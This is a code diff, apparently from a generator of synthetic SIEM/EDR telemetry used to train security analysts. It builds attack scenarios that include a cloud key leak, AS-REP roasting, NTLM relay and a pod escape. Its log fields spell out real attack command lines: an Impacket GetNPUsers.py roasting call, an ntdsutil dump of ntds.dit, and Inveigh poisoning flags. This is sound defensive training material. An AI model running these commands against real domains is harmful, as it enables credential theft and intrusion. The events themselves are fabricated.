+      source: "cloudtrail", vendor: "AWS GuardDuty", event_type: "cloud_api_call",
+      severity: "high", mitre_technique: "T1098.001", mitre_tactic: "Persistence", is_detection: true,
       src_ip: attackerIp,
-      description: `PutBucketPolicy, called by svc-lambda-monitoring, changed rocketstack-prod-customer-data's policy to allow public read access from any principal.`,
+      description: `GuardDuty raised Persistence:IAMUser/AnomalousBehavior (severity 8.0) for ${iamUser}, key ${leakedKey}: CreateAccessKey from ${attackerIp}.`,
       raw: {
-        "aws.cloudtrail.eventName": "PutBucketPolicy",
-        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
+        "aws.guardduty.type": "Persistence:IAMUser/AnomalousBehavior",
+        "aws.guardduty.severity": "8.0",
+        "aws.guardduty.title": "User rocketstack-ci-deploy is anomalously invoking APIs commonly used in Persistence tactics.",
+        "aws.guardduty.description": "APIs commonly used in Persistence tactics were invoked by user IAMUser : rocketstack-ci-deploy under unusual circumstances. Such activity is not typically seen from this user.",
+        "aws.guardduty.resource.accessKeyDetails.accessKeyId": leakedKey,
+        "aws.guardduty.resource.accessKeyDetails.userName": iamUser,
+        "aws.guardduty.service.action.awsApiCallAction.api": "CreateAccessKey",
+        "aws.guardduty.service.eventFirstSeen": T(10 * MIN),
+        "aws.guardduty.service.eventLastSeen": T(13 * MIN),
+        "aws.guardduty.service.count": 3,
         "aws.cloudtrail.awsRegion": "us-east-1",
-        "aws.cloudtrail.sourceIPAddress": attackerIp,
-        "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
-        "aws.cloudtrail.userIdentity.type": "IAMUser",
-        "aws.cloudtrail.userIdentity.userName": backdoorUser,
-        "aws.cloudtrail.userIdentity.arn": `arn:aws:iam::${accountId}:user/${backdoorUser}`,
-        "aws.cloudtrail.userIdentity.accountId": accountId,
-        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA247316892041BACK",
-        "aws.cloudtrail.request_parameters": `{\"bucketName\": \"${s3Bucket}\", \"AllowPublicRead\": true, \"Effect\": \"Allow\", \"Principal\": \"*\", \"Action\": \"s3:GetObject\"}`,
-        "aws.cloudtrail.requestParameters.bucketName": s3Bucket,
-        "aws.cloudtrail.request_parameters.AllowPublicRead": true,
-        "aws.cloudtrail.request_parameters.policy.Principal": "*",
-        "aws.cloudtrail.request_parameters.policy.Action": "s3:GetObject",
-        "aws.cloudtrail.request_parameters.policy.Effect": "Allow",
-        "aws.cloudtrail.request_id": "a1b2c3d4-0022-0001-abcd-ef0000000022",
-        "aws.cloudtrail.errorCode": null,
-        "event.outcome": "success",
-        "event.action": "PutBucketPolicy",
-        "cloud.provider": "aws",
-        "cloud.region": "us-east-1",
-        "cloud.account.id": accountId,
-        "s3.bucket": s3Bucket,
-        "s3.public_access_enabled": true,
-        "s3.previous_policy": "private",
-        "source.ip": attackerIp,
+        "aws.cloudtrail.userIdentity.userName": iamUser,
         "GeoLocation.country_name": "Singapore",
-        "GeoLocation.location.lat": 1.3521,
-        "GeoLocation.location.lon": 103.8198,
-        "action_result": "allowed",
+        "GeoLocation.city_name": "Singapore",
       },
     },
 
-    // ── T+24min: S3 server access logs — 4.7GB exfiltration via public access ─
+    // ── T+18: the new key reads the customer-data bucket (S3 data event, representative) ──
     {
-      id: "evt_cm_11_s3_exfil", ts: T(24 * MIN),
-      source: "cloudtrail", vendor: "AWS CloudTrail",
-      event_type: "cloud_storage_access",
+      id: "evt_kl_08_s3_getobject", ts: T(18 * MIN),
+      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_storage_access",
       severity: "critical", mitre_technique: "T1530", mitre_tactic: "Collection",
       src_ip: attackerIp,
-      description: `S3 access logs show 12,847 objects (4.7GB) downloaded from rocketstack-prod-customer-data by an anonymous requester at ${attackerIp}.`,
-      network: { bytes_out: 4_718_592_000, bytes_in: 0 },
+      cloud: { provider: "aws", service: "s3", api_call: "GetObject", region: "us-east-1", resource: s3Bucket },
+      description: `GetObject read ${sampleObject} from ${s3Bucket}, signed with access key ${backdoorKey} (${backdoorUser}) from ${attackerIp}.`,
       raw: {
         "aws.cloudtrail.eventName": "GetObject",
         "aws.cloudtrail.eventSource": "s3.amazonaws.com",
+        "aws.cloudtrail.eventCategory": "Data",
         "aws.cloudtrail.awsRegion": "us-east-1",
-        "aws.cloudtrail.sourceIPAddress": attackerIp,
-        "aws.cloudtrail.userAgent": "python-requests/2.31.0",
-        "aws.cloudtrail.userIdentity.type": "Anonymous",
-        "aws.cloudtrail.userIdentity.arn": null,
-        "aws.cloudtrail.userIdentity.accountId": null,
+        ...asUser(backdoorUser, backdoorArn, backdoorKey),
+        ...fromAttacker,
         "aws.cloudtrail.requestParameters.bucketName": s3Bucket,
-        "aws.cloudtrail.requestParameters.key": "customers/",
-        "aws.cloudtrail.request_id": "a1b2c3d4-0024-0001-abcd-ef0000000024",
-        "aws.cloudtrail.errorCode": null,
+        "aws.cloudtrail.requestParameters.key": sampleObject,
+        "aws.cloudtrail.additionalEventData.bytesTransferredOut": 412_388_190,
         "event.outcome": "success",
         "event.action": "GetObject",
         "cloud.provider": "aws",
         "cloud.region": "us-east-1",
         "cloud.account.id": accountId,
-        "s3.bucket": s3Bucket,
-        "s3.bytes_transferred": "4718592000",
-        "s3.access_method": "public_http",
-        "s3.requester": "ANONYMOUS",
-        "source.ip": attackerIp,
+      },
+    },
+
+    // ── T+31: GuardDuty S3 Protection on the read volume ──
+    {
+      id: "evt_kl_09_gd_s3_exfil", ts: T(31 * MIN),
+      source: "cloudtrail", vendor: "AWS GuardDuty", event_type: "cloud_api_call",
+      severity: "critical", mitre_technique: "T1530", mitre_tactic: "Collection", is_detection: true,
+      src_ip: attackerIp,
+      cloud: { provider: "aws", service: "s3", api_call: "GetObject", region: "us-east-1", resource: s3Bucket },
+      description: `GuardDuty raised Exfiltration:S3/AnomalousBehavior (severity 8.0) on ${s3Bucket}: 1,284 GetObject calls by ${backdoorUser}, key ${backdoorKey}, from ${attackerIp}.`,
+      raw: {
+        "aws.guardduty.type": "Exfiltration:S3/AnomalousBehavior",
+        "aws.guardduty.severity": "8.0",
+        "aws.guardduty.title": "An IAM entity invoked an S3 API in a suspicious way.",
+        "aws.guardduty.description": "An IAM entity invoked an S3 API in a suspicious way. Such activity is not typically seen from this entity.",
+        "aws.guardduty.resource.accessKeyDetails.accessKeyId": backdoorKey,
+        "aws.guardduty.resource.accessKeyDetails.userName": backdoorUser,
+        "aws.guardduty.resource.s3BucketDetails.name": s3Bucket,
+        "aws.guardduty.service.action.awsApiCallAction.api": "GetObject",
+        "aws.guardduty.service.eventFirstSeen": T(18 * MIN),
+        "aws.guardduty.service.eventLastSeen": T(29 * MIN),
+        "aws.guardduty.service.count": 1284,
+        "aws.cloudtrail.awsRegion": "us-east-1",
+        "aws.cloudtrail.requestParameters.bucketName": s3Bucket,
+        "aws.cloudtrail.userIdentity.userName": backdoorUser,
         "GeoLocation.country_name": "Singapore",
-        "GeoLocation.location.lat": 1.3521,
-        "GeoLocation.location.lon": 103.8198,
-        "network.bytes_out": "4718592000",
-        "action_result": "allowed",
+        "GeoLocation.city_name": "Singapore",
       },
     },
   ];
 
-  return { title: "Cloud Credential Leak — Cryptomining + Data Breach", events, T, MIN, attackerIp, iamUser, backdoorUser, s3Bucket };
+  return {
+    title: "Leaked AWS Key → IAM Backdoor → S3 Data Theft", events, T, MIN,
+    attackerIp, accountId, iamUser, leakedKey, backdoorUser, backdoorKey, s3Bucket, sampleObject,
+  };
 }
 
 /** Telemetry half of `buildDCSyncScenario`: the events and the story title, no answer key. */
@@ -3187,7 +2879,8 @@ export function dcSyncScenarioEvents() {
   const T = (ms: number) => new Date(B + ms).toISOString();
   const MIN = 60_000;
 
-  const attackerIp   = "185.220.101.47";
+  // Story-specific VPS (185.220.101.47 is the k8s-pod-escape / Tor-exit IP elsewhere).
+  const attackerIp   = "176.97.210.93";
   const dc01         = "SRV-NEXACORP-DC01";
   const dc02         = "SRV-NEXACORP-DC02";
   const adminEmail   = "it.admin@nexacorp.com";
@@ -3740,7 +3433,7 @@ export function supplyChainScenarioEvents() {
       event_type: "process_create",
       hostname: victim.hostname,
       severity: "high", mitre_technique: "T1195.002",
-      description: "CrowdStrike detected netpulse-agent spawning netpulse-telemetry-svc from /lib/x86_64-linux-gnu/ rather than /usr/lib/netpulse/ on prod-srv-01.",
+      description: "netpulse-agent spawned an unsigned netpulse-telemetry-svc from /lib/x86_64-linux-gnu/ rather than /usr/lib/netpulse/ on prod-srv-01, running as root.",
       process: { name: "netpulse-telemetry-svc", pid: 14882,
         path: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc",
         parent_name: "netpulse-agent", parent_pid: 14700,
@@ -3768,6 +3461,35 @@ export function supplyChainScenarioEvents() {
         "code.signature.trusted": false,
         "code.signature.status": "unsigned",
         "event.outcome": "success",
+      },
+    },
+    // ── First alert: the EDR's detection on the unsigned child of a signed vendor agent ──
+    {
+      id: "evt_sc_03b_edr_alert", ts: T(5 * MIN + 40_000),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert",
+      hostname: victim.hostname,
+      severity: "high", mitre_technique: "T1195.002", is_detection: true,
+      process: { name: "netpulse-telemetry-svc", pid: 14882,
+        path: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc",
+        parent_name: "netpulse-agent", parent_pid: 14700,
+        cmdline: "/lib/x86_64-linux-gnu/netpulse-telemetry-svc --config /etc/netpulse/telemetry.conf",
+        user: "root", hash: { sha256: malDllHash } },
+      description: "Falcon raised a High detection on prod-srv-01: an unsigned, never-before-seen binary in a system library folder was launched as root by netpulse-agent. Disposition: detection only.",
+      raw: {
+        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
+        "crowdstrike.detection.name": "UnsignedBinaryInSystemLibraryPath",
+        "crowdstrike.detection.description": "A process launched an unsigned executable with low global prevalence from a shared-library directory.",
+        "crowdstrike.detection.severity": "High",
+        "crowdstrike.detection.tactic": "Initial Access",
+        "crowdstrike.detection.technique": "Supply Chain Compromise: Compromise Software Supply Chain",
+        "crowdstrike.detection.technique_id": "T1195.002",
+        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
+        "crowdstrike.detection.process_tree": "systemd > netpulse-agent > netpulse-telemetry-svc",
+        "crowdstrike.SHA256": malDllHash,
+        "crowdstrike.platform": "Linux",
+        "crowdstrike.network_containment_state": "Not Contained",
+        "host.os.type": "linux",
+        "event.action": "alert",
       },
     },
     {
@@ -4138,7 +3860,7 @@ export function mfaFatigueScenarioEvents() {
       source: "o365", vendor: "Microsoft 365 Unified Audit Log",
       event_type: "sharepoint_download", severity: "high", mitre_technique: "T1530",
       hostname: "nexacorp.sharepoint.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
-      description: "847 files (2.3GB) were downloaded from the Finance SharePoint site under j.chen's account in 4 minutes.",
+      description: "j.chen's account downloaded Q1-2026-Financials.xlsx from the Finance SharePoint site from 91.108.4.33 — the first of a run of FileDownloaded records from that IP over the next 4 minutes.",
       raw: {
         "data.office365.Operation": "FileDownloaded",
         "data.office365.UserId": "j.chen@nexacorp.com",
@@ -4147,8 +3869,8 @@ export function mfaFatigueScenarioEvents() {
         "data.office365.SiteUrl": "https://nexacorp.sharepoint.com/sites/Finance",
         "data.office365.SourceFileName": "Q1-2026-Financials.xlsx",
         // Representative record — FileDownloaded is written per file; the
-        // 847-file / 2.3GB total (see description) is a SIEM-side aggregate
-        // across many records, not a count field on this one.
+        // run's total is a SIEM-side aggregate across many records, so the
+        // description states only what this record shows.
         "GeoLocation.country_name": "Russia",
       },
     },
@@ -4180,7 +3902,10 @@ export function mfaFatigueScenarioEvents() {
       source: "o365", vendor: "Microsoft Entra ID",
       event_type: "policy_modification", severity: "critical", mitre_technique: "T1556.009",
       hostname: "aad.nexacorp.com", user_email: "j.chen@nexacorp.com", src_ip: "91.108.4.33",
-      description: "The Require Compliant Device Conditional Access policy was modified to add DESKTOP-MOSCOW-99 to its device exclusion list.",
+      // Okta is the IdP; Microsoft 365 is federated to it, and the M365 tenant
+      // still enforces its own Entra Conditional Access after the Okta SSO.
+      // The Okta session opened mfa_06/07/10's M365 access — and this change.
+      description: "In the Okta-federated Microsoft 365 tenant, j.chen's account modified the Require Compliant Device Conditional Access policy to add DESKTOP-MOSCOW-99 to its device exclusion list, from 91.108.4.33.",
       raw: {
         "data.office365.Operation": "Update conditional access policy.",
         "data.office365.AzureActiveDirectoryEventType": 1,
@@ -4267,25 +3992,53 @@ export function asRepRoastingScenarioEvents() {
   const HOUR = 60 * MIN;
 
   const events: TelemetryEvent[] = [
-    // The LDAP discovery query below (asrep_01) is the AD-side trace of THIS
-    // process running — GetNPUsers.py must start before it can issue that
-    // query, so its process_create is timestamped a few seconds earlier. It
-    // was T+1min, after all three AS-REP tickets had already been issued —
-    // the tool that requests them cannot start after they were granted.
+    // ── Foothold: the interactive session every later workstation row hangs off ──
+    // The process rows below run under this logon; the 4768s and the later
+    // svc-backup logons all name this workstation's address.
+    {
+      id: "asrep_00_logon",
+      ts: T(-25 * MIN),
+      source: "ad", vendor: "Windows Security",
+      event_type: "auth_success", severity: "informational",
+      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com", src_ip: "10.0.1.45",
+      description: "m.johnson logged on interactively (Type 2) to WS-DEV-09.",
+      raw: {
+        "event.code": "4624",
+        "winlog.channel": "Security",
+        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
+        "winlog.computer_name": "WS-DEV-09",
+        "winlog.event_data.TargetUserName": "m.johnson",
+        "winlog.event_data.TargetDomainName": "NEXACORP",
+        "winlog.event_data.LogonType": "2",
+        "winlog.event_data.LogonProcessName": "User32",
+        "winlog.event_data.AuthenticationPackageName": "Kerberos",
+        "winlog.event_data.WorkstationName": "WS-DEV-09",
+        "winlog.event_data.IpAddress": "10.0.1.45",
+      },
+    },
+    // The process that issues the AS requests starts a few seconds before
+    // the DC logs the first of them (the tool cannot start after the tickets
+    // it requests were granted).
     {
       id: "asrep_05_impacket_tool",
       ts: T(-5_000),
       source: "edr", vendor: "CrowdStrike Falcon",
       event_type: "process_create", severity: "high", mitre_technique: "T1558.004",
       hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com",
-      description: "CrowdStrike detected m.johnson's account on WS-DEV-09 running GetNPUsers.py against nexacorp.local, writing hashcat-formatted output to C:\\Users\\m.johnson\\AppData\\Local\\Temp\\asrep_hashes.txt.",
+      description: "python.exe on WS-DEV-09 ran GetNPUsers.py under m.johnson against nexacorp.local, with an output file in m.johnson's Temp folder.",
       fp_explanation: "Python scripts run constantly on developer machines. 'GetNPUsers' isn't a well-known household tool name — many junior analysts don't recognize it as an Impacket attack module.",
+      // The process is the interpreter; the script is its argument (a .py never runs as an image).
+      process: {
+        name: "python.exe", pid: 7716, parent_name: "cmd.exe",
+        path: "C:\\Users\\m.johnson\\AppData\\Local\\Programs\\Python\\Python312\\python.exe",
+        cmdline: "python.exe C:\\Users\\m.johnson\\AppData\\Local\\Temp\\impacket\\GetNPUsers.py nexacorp.local/ -no-pass -usersfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\users.txt -format hashcat -outputfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\asrep_hashes.txt",
+      },
       raw: {
         "crowdstrike.process_name": "python.exe",
-        "crowdstrike.CommandLine": "GetNPUsers.py nexacorp.local/ -no-pass -usersfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\users.txt -format hashcat -outputfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\asrep_hashes.txt",
-        "crowdstrike.FileName": "GetNPUsers.py",
+        "crowdstrike.CommandLine": "python.exe C:\\Users\\m.johnson\\AppData\\Local\\Temp\\impacket\\GetNPUsers.py nexacorp.local/ -no-pass -usersfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\users.txt -format hashcat -outputfile C:\\Users\\m.johnson\\AppData\\Local\\Temp\\asrep_hashes.txt",
+        "crowdstrike.FileName": "python.exe",
         "crowdstrike.SHA256": pyHash,
-        "crowdstrike.FilePath": "C:\\Users\\m.johnson\\AppData\\Local\\Temp\\impacket\\",
+        "crowdstrike.FilePath": "C:\\Users\\m.johnson\\AppData\\Local\\Programs\\Python\\Python312\\",
         "crowdstrike.UserName": "NEXACORP\\m.johnson",
         "crowdstrike.parent_basefilename": "cmd.exe",
         "crowdstrike.local_address": "10.0.1.45",
@@ -4295,32 +4048,12 @@ export function asRepRoastingScenarioEvents() {
       },
     },
     {
-      id: "asrep_01_ldap_discovery",
-      ts: T(0),
-      source: "ad", vendor: "Windows Security",
-      event_type: "privileged_operation", severity: "medium", mitre_technique: "T1087.002",
-      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com", src_ip: "10.0.1.45",
-      description: "WS-DEV-09 sent an LDAP query against DC01 filtering for userAccountControl flag 4194304 — accounts with Kerberos pre-authentication disabled.",
-      fp_explanation: "LDAP queries against userAccountControl are extremely common — AD admins, PowerShell scripts, and monitoring tools run these constantly. Most analysts see this and move on without checking the specific flag being queried.",
-      raw: {
-        "event.code": "4662",
-        "winlog.channel": "Security",
-        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
-        "winlog.computer_name": "DC01",
-        "winlog.event_data.SubjectUserName": "m.johnson",
-        "winlog.event_data.SubjectDomainName": "NEXACORP",
-        "winlog.event_data.ObjectName": "DC=nexacorp,DC=com",
-        "winlog.event_data.AdditionalInfo": "LDAP filter: (userAccountControl:1.2.840.113556.1.4.803:=4194304)",
-        "winlog.event_data.IpAddress": "10.0.1.45",
-      },
-    },
-    {
       id: "asrep_02_asrep_svcbackup",
       ts: T(2 * MIN),
       source: "ad", vendor: "Windows Security",
       event_type: "kerberos_tgt", severity: "high", mitre_technique: "T1558.004",
       hostname: "DC01", user_email: "svc-backup@nexacorp.com", src_ip: "10.0.1.45",
-      description: "DC01 issued a Kerberos AS-REP for svc-backup with PreAuthType=0 and RC4 encryption — no credentials were required to receive this ticket.",
+      description: "DC01 logged a Kerberos TGT request (4768) for svc-backup from 10.0.1.45 with PreAuthType 0 and ticket encryption 0x17.",
       raw: {
         "event.code": "4768",
         "winlog.channel": "Security",
@@ -4398,6 +4131,43 @@ export function asRepRoastingScenarioEvents() {
         "winlog.event_data.PreAuthType": "0",
         "winlog.event_data.IpAddress": "10.0.1.45",
         "winlog.event_data.IpPort": "52343",
+      },
+    },
+    // ── First alert: Defender for Identity, after the three AS exchanges it reports ──
+    // REPLACES asrep_01, an "LDAP query" logged as a DC 4662 — a DC writes no
+    // record of a client's LDAP search filter. The directory-side evidence a SOC
+    // really gets is the identity sensor's alert on the AS exchanges themselves,
+    // shown as it lands in the SIEM (SecurityAlert): the alert name and its
+    // entities — source computer, source address, the accounts targeted.
+    {
+      id: "asrep_01_mdi_alert",
+      ts: T(3 * MIN + 10_000),
+      source: "ad", vendor: "Microsoft Defender for Identity",
+      event_type: "ids_signature", severity: "high", mitre_technique: "T1558.004", mitre_tactic: "Credential Access",
+      is_detection: true,
+      hostname: "WS-DEV-09", src_ip: "10.0.1.45",
+      description: "Defender for Identity raised 'Suspected AS-REP Roasting attack' with source WS-DEV-09 (10.0.1.45) and target accounts svc-backup, svc-monitoring and svc-reports.",
+      raw: {
+        "TimeGenerated": T(3 * MIN + 10_000),
+        "AlertName": "Suspected AS-REP Roasting attack",
+        "AlertSeverity": "High",
+        "ProductName": "Azure Advanced Threat Protection",
+        "VendorName": "Microsoft",
+        "SystemAlertId": "6f1c2b7e-4a9d-4e31-9b52-0c8e7d14a3f6",
+        "Status": "New",
+        "StartTime": T(2 * MIN),
+        "EndTime": T(2 * MIN + 30_000),
+        "Tactics": "CredentialAccess",
+        "Techniques": "[\"T1558\"]",
+        "CompromisedEntity": "WS-DEV-09",
+        "Entities": JSON.stringify([
+          { $id: "2", HostName: "WS-DEV-09", DnsDomain: "nexacorp.com", Type: "host" },
+          { $id: "3", Address: "10.0.1.45", Type: "ip" },
+          { $id: "4", Name: "svc-backup", NTDomain: "NEXACORP", Type: "account" },
+          { $id: "5", Name: "svc-monitoring", NTDomain: "NEXACORP", Type: "account" },
+          { $id: "6", Name: "svc-reports", NTDomain: "NEXACORP", Type: "account" },
+          { $id: "7", HostName: "DC01", DnsDomain: "nexacorp.com", Type: "host" },
+        ]),
       },
     },
     {
@@ -4500,7 +4270,15 @@ export function asRepRoastingScenarioEvents() {
       source: "edr", vendor: "CrowdStrike Falcon",
       event_type: "file_create", severity: "critical", mitre_technique: "T1003.003",
       hostname: "DC01", user_email: "svc-backup@nexacorp.com",
-      description: "svc-backup ran ntdsutil.exe on DC01 to create an IFM snapshot, extracting ntds.dit to C:\\Temp\\ntds_dump\\.",
+      description: "ntdsutil.exe running as svc-backup on DC01 wrote ntds.dit to C:\\Temp\\ntds_dump\\Active Directory\\.",
+      // The file write needs its path and writer as event facts for the EDR
+      // record to render (it rendered nothing from the vendor keys alone).
+      process: {
+        name: "ntdsutil.exe", pid: 6412, path: "C:\\Windows\\System32\\ntdsutil.exe",
+        cmdline: "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds_dump\" q q",
+        user: "NEXACORP\\svc-backup",
+      },
+      file: { name: "ntds.dit", path: "C:\\Temp\\ntds_dump\\Active Directory\\ntds.dit", size: 51380224 },
       raw: {
         "crowdstrike.process_name": "ntdsutil.exe",
         "crowdstrike.CommandLine": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds_dump\" q q",
@@ -4522,6 +4300,28 @@ export function ntlmRelayScenarioEvents() {
   const MIN = 60_000;
 
   const events: TelemetryEvent[] = [
+    // ── Foothold: the session the poisoner runs under ───────────────────────
+    {
+      id: "ntlm_00_logon",
+      ts: T(-40 * MIN),
+      source: "ad", vendor: "Windows Security",
+      event_type: "auth_success", severity: "informational",
+      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com", src_ip: "10.0.1.45",
+      description: "m.johnson logged on interactively (Type 2) to WS-DEV-09.",
+      raw: {
+        "event.code": "4624",
+        "winlog.channel": "Security",
+        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
+        "winlog.computer_name": "WS-DEV-09",
+        "winlog.event_data.TargetUserName": "m.johnson",
+        "winlog.event_data.TargetDomainName": "NEXACORP",
+        "winlog.event_data.LogonType": "2",
+        "winlog.event_data.LogonProcessName": "User32",
+        "winlog.event_data.AuthenticationPackageName": "Kerberos",
+        "winlog.event_data.WorkstationName": "WS-DEV-09",
+        "winlog.event_data.IpAddress": "10.0.1.45",
+      },
+    },
     // Inveigh has to be listening before it can answer the LLMNR broadcast
     // below — its process_create was timestamped T+1s, a full second AFTER
     // that broadcast, which has the poisoner starting after the packet it
@@ -4546,8 +4346,43 @@ export function ntlmRelayScenarioEvents() {
         "crowdstrike.UserName": "NEXACORP\\m.johnson",
         "crowdstrike.parent_basefilename": "powershell.exe",
         "crowdstrike.local_address": "10.0.1.45",
+        // Same process as the alert ntlm_04b — one pid on both records.
+        "crowdstrike.RawProcessId": "5976",
         "crowdstrike.Severity": 95,
         "crowdstrike.SHA256": makeSha256("inveigh_exe_llmnr_poisoner"),
+      },
+    },
+    // ── First alert: the EDR's behavioural detection on that process ──────────
+    // The page a SOC actually gets, seconds after the process start and before
+    // any victim traffic. Detect-only policy on this host group: the process
+    // keeps running, which is why the relay below still happens.
+    {
+      id: "ntlm_04b_edr_alert",
+      ts: T(-6_000),
+      source: "edr", vendor: "CrowdStrike Falcon",
+      event_type: "edr_alert", severity: "critical", mitre_technique: "T1557.001", mitre_tactic: "Credential Access",
+      is_detection: true,
+      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com", src_ip: "10.0.1.45",
+      process: {
+        name: "Inveigh.exe", pid: 5976, path: "C:\\Users\\m.johnson\\AppData\\Local\\Temp\\Inveigh.exe", parent_name: "powershell.exe",
+        cmdline: "Inveigh.exe -LLMNR Y -NBNS Y -SMB Y -Inspect N -FileOutput Y",
+        user: "NEXACORP\\m.johnson", integrity: "medium",
+        hash: { sha256: makeSha256("inveigh_exe_llmnr_poisoner") },
+      },
+      description: "The EDR raised a critical alert on WS-DEV-09 for Inveigh.exe (user m.johnson, parent powershell.exe); the policy action was detect-only.",
+      raw: {
+        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
+        "crowdstrike.detection.scenario": "credential_theft",
+        "crowdstrike.detection.tactic": "Credential Access",
+        "crowdstrike.detection.tactic_id": "TA0006",
+        "crowdstrike.detection.technique": "LLMNR/NBT-NS Poisoning and SMB Relay",
+        "crowdstrike.detection.technique_id": "T1557.001",
+        "crowdstrike.detection.severity": "Critical",
+        "crowdstrike.detection.pattern_disposition": "0",
+        "crowdstrike.detection.pattern_disposition_description": "Detection, standard detection.",
+        "crowdstrike.detection.process_tree": "explorer.exe > powershell.exe > Inveigh.exe",
+        "host.name": "WS-DEV-09",
+        "action_result": "detected",
       },
     },
     {
@@ -4718,13 +4553,14 @@ export function ntlmRelayScenarioEvents() {
       source: "edr", vendor: "CrowdStrike Falcon",
       event_type: "process_access", severity: "critical", mitre_technique: "T1003.001",
       hostname: "SRV-FILE01",
-      description: "cmd.exe running as NT AUTHORITY\\SYSTEM on SRV-FILE01 accessed lsass.exe (PID 688) with GrantedAccess 0x1FFFFF.",
+      // No hard-coded lsass PID: the EDR record prints the host's own lsass.exe
+      // process id (one per host per boot), and "PID 688" contradicted it.
+      description: "cmd.exe running as NT AUTHORITY\\SYSTEM on SRV-FILE01 opened a handle to lsass.exe with GrantedAccess 0x1FFFFF.",
       raw: {
         "crowdstrike.target_imagefilename": "lsass.exe",
         "crowdstrike.GrantedAccess": "0x1FFFFF",
         "crowdstrike.process_name": "cmd.exe",
         "crowdstrike.UserName": "NT AUTHORITY\\SYSTEM",
-        "crowdstrike.target_process_id": "688",
         "crowdstrike.Severity": 95,
       },
     },
@@ -4733,7 +4569,7 @@ export function ntlmRelayScenarioEvents() {
       ts: T(25 * MIN),
       source: "firewall", vendor: "FortiGate",
       event_type: "net_connection", severity: "critical", mitre_technique: "T1021.002",
-      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_port: 445,
+      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_ip: "10.0.2.30", dst_port: 445,
       // Was ONE record carrying `data.dstip: "10.0.2.30,10.0.2.31,10.0.0.5"` and
       // `data.msg: "SMB lateral movement to multiple targets"`. FortiGate writes
       // one record per session — dstip is never a list — and a traffic log does
@@ -4760,7 +4596,7 @@ export function ntlmRelayScenarioEvents() {
       ts: T(25 * MIN + 40_000),
       source: "firewall", vendor: "FortiGate",
       event_type: "net_connection", severity: "high", mitre_technique: "T1021.002",
-      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_port: 445,
+      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_ip: "10.0.2.31", dst_port: 445,
       description: "SRV-FILE01 opened an outbound SMB session to 10.0.2.31 on port 445.",
       raw: {
         "data.type": "traffic",
@@ -4781,7 +4617,7 @@ export function ntlmRelayScenarioEvents() {
       ts: T(25 * MIN + 95_000),
       source: "firewall", vendor: "FortiGate",
       event_type: "net_connection", severity: "high", mitre_technique: "T1021.002",
-      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_port: 445,
+      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_ip: "10.0.0.5", dst_port: 445,
       description: "SRV-FILE01 opened an outbound SMB session to 10.0.0.5 on port 445.",
       raw: {
         "data.type": "traffic",
@@ -4817,8 +4653,8 @@ export function k8sPodEscapeScenarioEvents() {
       // EXISTING container. T1610 is Deploy Container (creating a new one),
       // which is correct for k8s_09_privileged_pod but wrong here.
       event_type: "k8s_exec", severity: "medium", mitre_technique: "T1609",
-      hostname: "api-prod-7f8b9c", src_ip: "185.220.101.47", dst_port: 443,
-      description: "The ci-deploy-token service account ran kubectl exec into container api-prod-7f8b9c from 185.220.101.47, a known Tor exit node.",
+      hostname: "api-prod-7f8b9c", src_ip: "193.233.48.71", dst_port: 443,
+      description: "The ci-deploy-token service account ran kubectl exec into container api-prod-7f8b9c from 193.233.48.71, an address on a hosting provider's network.",
       fp_explanation: "kubectl exec is routine in dev and SRE workflows — engineers exec into containers to debug them many times a day, and ci-deploy is a legitimate service account that is expected to touch production workloads.",
       raw: {
         "kubernetes.audit.verb": "create",
@@ -4827,7 +4663,7 @@ export function k8sPodEscapeScenarioEvents() {
         "kubernetes.audit.objectRef.namespace": "production",
         "kubernetes.audit.user.username": "ci-deploy-token",
         "kubernetes.audit.user.groups[0]": "system:serviceaccounts",
-        "kubernetes.audit.sourceIPs[0]": "185.220.101.47",
+        "kubernetes.audit.sourceIPs[0]": "193.233.48.71",
         "kubernetes.audit.responseStatus.code": 101,
         "kubernetes.audit.requestURI": "/api/v1/namespaces/production/pods/api-prod-7f8b9c/exec?command=sh&stdin=true&stdout=true&tty=true",
         "kubernetes.audit.userAgent": "kubectl/v1.28.2 (linux/amd64) kubernetes/9124985",
@@ -4855,7 +4691,7 @@ export function k8sPodEscapeScenarioEvents() {
       ts: T(1 * MIN),
       source: "k8s_audit", vendor: "Kubernetes Audit",
       event_type: "k8s_rbac", severity: "medium",
-      hostname: "api-prod-7f8b9c", src_ip: "185.220.101.47",
+      hostname: "api-prod-7f8b9c", src_ip: "193.233.48.71",
       description: "The pod spec for api-prod-7f8b9c was read. The container runs with privileged true, hostPID true, and CAP_SYS_ADMIN.",
       fp_explanation: "Reading a pod spec is ordinary operational activity, and this deployment has run with these settings since it was created — the workload needs host-level metrics collection.",
       raw: {
@@ -4864,7 +4700,7 @@ export function k8sPodEscapeScenarioEvents() {
         "kubernetes.audit.objectRef.name": "api-prod-7f8b9c",
